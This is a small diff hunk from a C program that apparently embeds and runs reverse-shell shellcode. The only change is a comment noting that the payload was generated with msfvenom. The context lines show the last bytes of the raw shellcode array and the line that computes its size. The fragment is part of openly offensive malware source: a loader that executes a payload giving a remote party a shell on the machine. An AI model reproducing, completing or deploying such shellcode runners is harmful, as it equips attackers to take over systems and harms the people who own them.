@@ -41,7 +41,7 @@ int main()
         "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
         "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
         "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
-}; //reverse shell execution shellcode.
+}; //reverse shell execution shellcode created via msfvenom.
     //Size of shellcode.
     int shellcode_size = sizeof(shellcode);
 
